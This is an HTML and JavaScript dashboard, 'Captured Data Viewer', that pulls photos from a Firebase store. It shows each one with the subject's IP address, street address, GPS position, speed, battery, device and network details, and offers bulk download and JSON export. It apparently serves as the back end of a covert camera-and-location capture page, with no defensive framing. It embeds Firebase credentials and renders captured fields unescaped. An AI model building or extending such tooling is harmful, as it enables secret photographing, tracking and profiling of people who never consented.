<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Viewer</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            margin-bottom: 30px;
            text-align: center;
        }
        .header h1 { color: #333; margin-bottom: 10px; }
        .header p { color: #666; }
        .controls {
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }
        .controls button {
            padding: 10px 20px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }
        .controls button:hover { background: #764ba2; }
        .controls input, .controls select {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .date-group {
            background: white;
            border-radius: 10px;
            margin-bottom: 20px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .date-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 20px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .date-header:hover { background: linear-gradient(135deg, #764ba2 0%, #667eea 100%); }
        .date-content {
            padding: 20px;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        .photo-card {
            background: #f9f9f9;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .photo-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
        }
        .photo-image {
            width: 100%;
            height: 250px;
            object-fit: cover;
            cursor: pointer;
        }
        .photo-info {
            padding: 15px;
            background: white;
        }
        .photo-time { font-weight: bold; color: #333; margin-bottom: 10px; }
        .photo-meta {
            font-size: 12px;
            color: #666;
            margin-bottom: 10px;
            line-height: 1.6;
        }
        .photo-actions {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .photo-actions button {
            flex: 1;
            padding: 8px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.3s;
        }
        .btn-preview { background: #667eea; color: white; }
        .btn-preview:hover { background: #764ba2; }
        .btn-download { background: #48bb78; color: white; }
        .btn-download:hover { background: #38a169; }
        .btn-map { background: #ed8936; color: white; }
        .btn-map:hover { background: #dd6b20; }
        .btn-details { background: #4299e1; color: white; }
        .btn-details:hover { background: #3182ce; }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
            overflow: auto;
        }
        .modal-content {
            background-color: white;
            margin: auto;
            padding: 20px;
            border-radius: 10px;
            width: 90%;
            max-width: 900px;
            max-height: 90vh;
            overflow-y: auto;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover { color: #000; }
        .modal-image {
            width: 100%;
            max-height: 500px;
            object-fit: contain;
            margin-bottom: 20px;
            border-radius: 8px;
        }
        .details-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        .details-table td {
            padding: 10px;
            border-bottom: 1px solid #ddd;
        }
        .details-table td:first-child {
            font-weight: bold;
            width: 30%;
            background: #f5f5f5;
        }
        .loading {
            text-align: center;
            padding: 40px;
            color: white;
            font-size: 18px;
        }
        .empty-state {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            color: #666;
        }
        .search-box {
            flex: 1;
            min-width: 200px;
        }
        .sort-box {
            min-width: 150px;
        }
        .toggle-icon {
            font-size: 12px;
        }
        .date-content.collapsed {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üì∏ Captured Data Viewer</h1>
            <p>View all captured photos and metadata</p>
        </div>

        <div class="controls">
            <input type="text" id="searchBox" class="search-box" placeholder="Search by address or IP...">
            <select id="sortBox" class="sort-box">
                <option value="newest">Newest First</option>
                <option value="oldest">Oldest First</option>
            </select>
            <button onclick="refreshData()">üîÑ Refresh</button>
            <button onclick="downloadAllPhotos()">üì• Download All</button>
            <button onclick="exportJSON()">üìÑ Export JSON</button>
        </div>

        <div id="dataContainer" class="loading">Loading captured data...</div>
    </div>

    <!-- Modal for Preview -->
    <div id="previewModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('previewModal')">&times;</span>
            <img id="previewImage" class="modal-image" src="" alt="Preview">
            <div id="previewDetails"></div>
        </div>
    </div>

    <!-- Modal for Details -->
    <div id="detailsModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('detailsModal')">&times;</span>
            <h2>Complete Metadata</h2>
            <div id="detailsContent"></div>
        </div>
    </div>

    <script>
        // ==================== FIREBASE CONFIGURATION ====================
        const firebaseConfig = {
            apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
            authDomain: "esrat-4e28f.firebaseapp.com",
            databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
            projectId: "esrat-4e28f",
            storageBucket: "esrat-4e28f.appspot.com",
            messagingSenderId: "712315598095",
            appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
        };

        firebase.initializeApp(firebaseConfig);
        const storage = firebase.storage();

        let allData = {};

        // ==================== UTILITY FUNCTIONS ====================

        // Fetch Data from Firebase Storage
        async function fetchData() {
            try {
                const listRef = storage.ref('users'); // Assuming photos are stored in 'users/' as per capture.html
                const res = await listRef.listAll();
                
                const items = res.items;
                if (items.length === 0) {
                    document.getElementById('dataContainer').innerHTML = '<div class="empty-state">No captured data found in Firebase Storage.</div>';
                    return;
                }

                const dataPromises = items.map(async (itemRef) => {
                    const [url, metadata] = await Promise.all([
                        itemRef.getDownloadURL(),
                        itemRef.getMetadata()
                    ]);

                    // Extract custom metadata, which is stored under 'customMetadata'
                    const customMeta = metadata.customMetadata || {};
                    
                    // Construct a single data object
                    return {
                        id: itemRef.name,
                        photoURL: url,
                        timestamp: customMeta.timestamp || 'N/A',
                        readableAddress: customMeta.readableAddress || 'N/A',
                        ipAddress: customMeta.ipAddress || 'N/A',
                        latitude: customMeta.latitude || 'N/A',
                        longitude: customMeta.longitude || 'N/A',
                        // Store all custom metadata for the details modal
                        metadata: customMeta
                    };
                });

                const fetchedData = await Promise.all(dataPromises);
                
                // Convert array to object keyed by ID for easier lookup
                allData = fetchedData.reduce((acc, item) => {
                    acc[item.id] = item;
                    return acc;
                }, {});

                console.log('Fetched data:', allData);
                renderData();
            } catch (error) {
                console.error('Error fetching data:', error);
                document.getElementById('dataContainer').innerHTML = '<div class="empty-state">Error loading data. Please check Firebase Storage rules and configuration.</div>';
            }
        }

        // Group Data by Date
        function groupDataByDate(data) {
            const grouped = {};
            Object.entries(data).forEach(([key, value]) => {
                // Timestamp format is "Day, DD/MM/YYYY, HH:MM:SS"
                const timestamp = value.timestamp || 'Unknown';
                // Extract date part (DD/MM/YYYY)
                const dateMatch = timestamp.match(/\d{2}\/\d{2}\/\d{4}/);
                const date = dateMatch ? dateMatch[0] : 'Unknown Date';

                if (!grouped[date]) grouped[date] = [];
                grouped[date].push({ id: key, ...value });
            });
            return grouped;
        }

        // Sort Data
        function sortData(grouped, sortType) {
            const sorted = {};
            // Sort dates based on DD/MM/YYYY format
            const dates = Object.keys(grouped).sort((a, b) => {
                const [dA, mA, yA] = a.split('/').map(Number);
                const [dB, mB, yB] = b.split('/').map(Number);
                const dateA = new Date(yA, mA - 1, dA).getTime();
                const dateB = new Date(yB, mB - 1, dB).getTime();
                return sortType === 'newest' ? dateB - dateA : dateA - dateB;
            });

            dates.forEach(date => {
                // Sort items within each date group by timestamp (time part)
                sorted[date] = grouped[date].sort((a, b) => {
                    // Timestamp format is "Day, DD/MM/YYYY, HH:MM:SS"
                    const timeA = new Date(a.timestamp.split(', ')[2]);
                    const timeB = new Date(b.timestamp.split(', ')[2]);
                    return sortType === 'newest' ? timeB - timeA : timeA - timeB;
                });
            });
            return sorted;
        }

        // Filter Data
        function filterData(grouped, searchTerm) {
            if (!searchTerm) return grouped;
            const filtered = {};
            Object.entries(grouped).forEach(([date, items]) => {
                const filteredItems = items.filter(item => {
                    const address = (item.readableAddress || '').toLowerCase();
                    const ip = (item.ipAddress || '').toLowerCase();
                    return address.includes(searchTerm.toLowerCase()) || ip.includes(searchTerm.toLowerCase());
                });
                if (filteredItems.length > 0) {
                    filtered[date] = filteredItems;
                }
            });
            return filtered;
        }

        // Render Data
        function renderData() {
            const searchTerm = document.getElementById('searchBox').value;
            const sortType = document.getElementById('sortBox').value;

            let grouped = groupDataByDate(allData);
            grouped = filterData(grouped, searchTerm);
            grouped = sortData(grouped, sortType);

            if (Object.keys(grouped).length === 0) {
                document.getElementById('dataContainer').innerHTML = '<div class="empty-state">No captured data found.</div>';
                return;
            }

            let html = '';
            Object.entries(grouped).forEach(([date, items]) => {
                html += `
                    <div class="date-group">
                        <div class="date-header" onclick="toggleDateGroup(this)">
                            <span>üìÖ ${date} (${items.length} photo${items.length > 1 ? 's' : ''})</span>
                            <span class="toggle-icon">‚ñº</span>
                        </div>
                        <div class="date-content">
                            ${items.map(item => `
                                <div class="photo-card">
                                    <img class="photo-image" src="${item.photoURL}" alt="Captured photo" onclick="openPreview('${item.photoURL}', '${item.timestamp}', '${item.ipAddress}', '${item.readableAddress}', '${item.latitude}', '${item.longitude}')">
                                    <div class="photo-info">
                                        <div class="photo-time">‚è∞ ${item.timestamp.split(', ')[2]}</div>
                                        <div class="photo-meta">
                                            üìç ${item.readableAddress}<br>
                                            üåê IP: ${item.ipAddress}<br>
                                            üîã Battery: ${item.metadata.battery || 'N/A'}<br>
                                            üì° Network: ${item.metadata.networkType || 'N/A'}
                                        </div>
                                        <div class="photo-actions">
                                            <button class="btn-preview" onclick="openPreview('${item.photoURL}', '${item.timestamp}', '${item.ipAddress}', '${item.readableAddress}', '${item.latitude}', '${item.longitude}')">Preview</button>
                                            <button class="btn-download" onclick="downloadPhoto('${item.photoURL}', '${item.timestamp}')">Download</button>
                                            <button class="btn-map" onclick="showMap('${item.latitude}', '${item.longitude}')">Map</button>
                                            <button class="btn-details" onclick="showDetails('${item.id}')">Details</button>
                                        </div>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            });

            document.getElementById('dataContainer').innerHTML = html;
        }

        // Toggle Date Group
        function toggleDateGroup(element) {
            const content = element.nextElementSibling;
            content.classList.toggle('collapsed');
            const icon = element.querySelector('.toggle-icon');
            icon.textContent = content.classList.contains('collapsed') ? '‚ñ∂' : '‚ñº';
        }

        // Open Preview Modal
        function openPreview(photoURL, timestamp, ip, address, lat, lon) {
            document.getElementById('previewImage').src = photoURL;
            document.getElementById('previewDetails').innerHTML = `
                <table class="details-table">
                    <tr><td>Timestamp</td><td>${timestamp}</td></tr>
                    <tr><td>Public IP</td><td>${ip}</td></tr>
                    <tr><td>Address</td><td>${address}</td></tr>
                    <tr><td>GPS</td><td>${lat}, ${lon}</td></tr>
                </table>
                <button class="btn-map" style="width: 100%; margin-top: 15px;" onclick="showMap('${lat}', '${lon}')">View on Map</button>
            `;
            document.getElementById('previewModal').style.display = 'block';
        }

        // Show Details Modal
        function showDetails(id) {
            const item = allData[id];
            const meta = item.metadata;
            let html = '<table class="details-table">';
            
            // General Info
            html += `<tr><td>Timestamp</td><td>${meta.timestamp || 'N/A'}</td></tr>`;
            html += `<tr><td>Public IP</td><td>${meta.ipAddress || 'N/A'}</td></tr>`;
            html += `<tr><td>Address</td><td>${meta.readableAddress || 'N/A'}</td></tr>`;
            
            // GPS Info
            html += `<tr><td>GPS Latitude</td><td>${meta.latitude || 'N/A'}</td></tr>`;
            html += `<tr><td>GPS Longitude</td><td>${meta.longitude || 'N/A'}</td></tr>`;
            html += `<tr><td>Altitude</td><td>${meta.altitude || 'N/A'}</td></tr>`;
            html += `<tr><td>Speed</td><td>${meta.speed || 'N/A'}</td></tr>`;

            // Device Info
            html += `<tr><td>Battery Level</td><td>${meta.battery || 'N/A'}</td></tr>`;
            html += `<tr><td>Screen Resolution</td><td>${meta.screenResolution || 'N/A'}</td></tr>`;
            html += `<tr><td>Device Name (Platform)</td><td>${meta.deviceName || 'N/A'}</td></tr>`;
            html += `<tr><td>Browser (User Agent)</td><td style="word-break: break-all;">${meta.browser || 'N/A'}</td></tr>`;
            html += `<tr><td>Device Memory</td><td>${meta.deviceMemory || 'N/A'}</td></tr>`;
            html += `<tr><td>Hardware Concurrency</td><td>${meta.hardwareConcurrency || 'N/A'}</td></tr>`;

            // Network Info
            html += `<tr><td>Connection Speed</td><td>${meta.connectionSpeed || 'N/A'}</td></tr>`;
            html += `<tr><td>Network Type</td><td>${meta.networkType || 'N/A'}</td></tr>`;

            html += '</table>';
            document.getElementById('detailsContent').innerHTML = html;
            document.getElementById('detailsModal').style.display = 'block';
        }

        // Close Modal
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        // Show Map
        function showMap(latitude, longitude) {
            if (latitude && longitude && latitude !== 'N/A' && longitude !== 'N/A') {
                const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15`;
                window.open(mapUrl, '_blank');
            } else {
                alert('No coordinates available for this photo.');
            }
        }

        // Download Photo
        function downloadPhoto(photoURL, timestamp) {
            const link = document.createElement('a');
            link.href = photoURL;
            link.download = `photo_${timestamp.replace(/[\s,:\/]/g, '_')}.png`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // Download All Photos
        function downloadAllPhotos() {
            alert('Downloading all photos... This may take a while depending on the number of photos.');
            Object.values(allData).forEach((item, index) => {
                setTimeout(() => {
                    downloadPhoto(item.photoURL, item.timestamp);
                }, index * 500);
            });
        }

        // Export JSON
        function exportJSON() {
            const exportData = Object.values(allData).map(item => item.metadata);
            const dataStr = JSON.stringify(exportData, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(dataBlob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `captured_data_${new Date().getTime()}.json`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // Refresh Data
        function refreshData() {
            document.getElementById('dataContainer').innerHTML = '<div class="loading">Refreshing data...</div>';
            fetchData();
        }

        // Event Listeners
        document.getElementById('searchBox').addEventListener('input', renderData);
        document.getElementById('sortBox').addEventListener('change', renderData);

        // Close modal when clicking outside
        window.onclick = function(event) {
            const previewModal = document.getElementById('previewModal');
            const detailsModal = document.getElementById('detailsModal');
            if (event.target === previewModal) previewModal.style.display = 'none';
            if (event.target === detailsModal) detailsModal.style.display = 'none';
        };

        // Load data on page load
        window.addEventListener('load', fetchData);
    </script>
</body>
</html>
